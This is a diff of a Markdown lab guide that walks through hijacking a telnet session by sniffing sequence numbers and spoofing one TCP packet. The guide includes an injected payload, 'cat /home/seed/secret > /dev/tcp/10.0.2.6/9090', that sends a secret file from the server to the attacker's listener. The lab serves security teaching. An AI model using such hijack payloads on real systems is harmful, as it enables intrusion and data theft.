@@ -16,35 +16,35 @@ In this lab, we will hijack a telnet session (between the victim client and the 
 
 ### Steps
 
-1. let the client connect to the server using telnet.
+1. Let the client connect to the server using telnet.
 
 ![alt text](lab-tcp-hijack-telnet.png "Lab tcp session hijacking telnet")
 
-2. the client uses this *echo* command to create a secret file on the server.
+2. The client uses this *echo* command to create a secret file on the server.
 
 ![alt text](lab-tcp-hijack-echo.png "Lab tcp session hijacking echo")
 
-3. the client uses the *cat* command to confirm the file now exists and is located at /home/seed/secret:
+3. The client uses the *cat* command to confirm the file now exists and is located at /home/seed/secret:
 ![alt text](lab-tcp-hijack-cat.png "Lab tcp session hijacking cat")
 
-4. let the attacker start monitoring network traffic using wireshark.
+4. Let the attacker start monitoring network traffic using wireshark.
 
 ![alt text](lab-tcp-hijack-start-wireshark.png "Lab tcp hijack start wireshark")
 ![alt text](lab-tcp-hijack-start-capture.png "Lab tcp hijack start capture")
 
-5. client produces some telnet packets. (any telnet packets, you can just type a command like *ls*).
+5. Client produces some telnet packets. (any telnet packets, you can just type a command like *ls*).
 
 ![alt text](lab-tcp-hijack-ls.png "Lab tcp hijack ls command")
 
-6. attacker stops wireshark capturing, and navigates to the latest packet sent from the client to the server.
+6. Attacker stops wireshark capturing, and navigates to the latest packet sent from the client to the server. Now we need to examine this packet carefully, so as to obtain the ip addresses, the ttl attribute, the port numbers, the next sequence number, the acknowledgment number, and the window size.
 
-This image shows the ip addresses, and the ttl attribute.
+This image shows the IP header, from which we see the ip addresses, and the ttl attribute.
 ![alt text](lab-tcp-hijack-ip-header.png "Lab tcp hijack latest tcp capture - part 1, ip header")
 
-This image shows the port numbers, the next sequence number, the acknowledgment number, and the window size - still the same packet.
+This image shows the TCP header, from which we see the port numbers, the next sequence number, the acknowledgment number, and the window size - still the same packet.
 ![alt text](lab-tcp-hijack-tcp-header.png "Lab tcp hijack latest tcp capture - part 2, tcp header")
 
-7. the above packet provides the information which the attacker needs to know in order to perform the tcp reset attack. now, the attacker, mimicking the client, only needs to send one single regular TCP packet to the server. To send a regular TCP packet, a python script named send_tcp.py is provided. When running this script, it will send a TCP packet to a destination. You need to change the script so that the following 9 lines match with your situation.
+7. The above packet provides the information which the attacker needs to know in order to perform the tcp session hijack attack. Now, the attacker, mimicking the client, only needs to send one single regular TCP packet to the server. To send a regular TCP packet, a python script named send_tcp.py is provided. When running this script, it will send a TCP packet to a destination. You need to change the script so that the following 9 lines match with your situation.
 
 ```console
 source_ip = "10.0.2.4"
@@ -74,7 +74,7 @@ tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
 ![alt text](lab-tcp-hijack-before-enter.png "Lab tcp hijacking attack before pressing enter")
 ![alt text](lab-tcp-hijack-after-enter.png "Lab tcp hijacking attack after pressing enter")
 
-9. once the attacker pressed enter to execute the above script, if the attack is successful, the victim server's secret file will be displayed in the attacker's terminal window:
+9. Once the attacker pressed enter to execute the above script, if the attack is successful, the victim server's secret file will be displayed in the attacker's terminal window:
 
 ![alt text](lab-tcp-hijack-success.png "Lab tcp session hijacking attack successful")
 
